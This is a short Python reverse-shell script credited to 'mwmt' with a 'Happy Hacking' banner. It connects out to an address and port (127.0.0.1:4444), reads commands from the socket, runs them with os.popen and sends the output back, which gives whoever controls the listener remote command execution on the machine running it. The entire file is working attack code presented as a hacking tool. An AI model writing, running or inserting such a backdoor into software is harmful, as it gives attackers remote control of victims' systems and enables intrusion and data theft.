#!/usr/bin/env python

"""
	*--------------------------------------*
	|       programmed by : mwmt           |    
	*--------------------------------------*
       _     __             _     __  ____  
      || \  // | \ \     / || \  // |  ||   
      ||  \//  |  \_\/\_/  ||  \//  |  || 
	
	              Happy Hacking               
	            ---------------- 
"""
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.setblocking(1)

ip = "127.0.0.1"
port = 4444

s.connect((ip,port))

s.send(b'Happy Hacking ^_^\n')
while True:
	try:
		command = s.recv(1024).decode('utf-8')
		command = str(command)
		if "cd" in command:
			command = command.replace("\n","")
			command = os.chdir(command.split('cd ')[1])
			com = os.popen("ls")
			result = str(com.read()).encode('utf-8')
			s.send(result)
		else:
			treating = os.popen(command)
			results = str(treating.read())
			results = results.encode('utf-8')
			s.send(results)
	except socket.error:
		exit(0)
	except OSError:
		s.send(b'file not found!\n')
	except IndexError:
		s.send(b'try again!\n')
	except UnicodeEncodeError:
		send(b'problem in coding\n')
	except KeyboardInterrupt:
		s.send(b'connection closed !!\n')
		exit(0)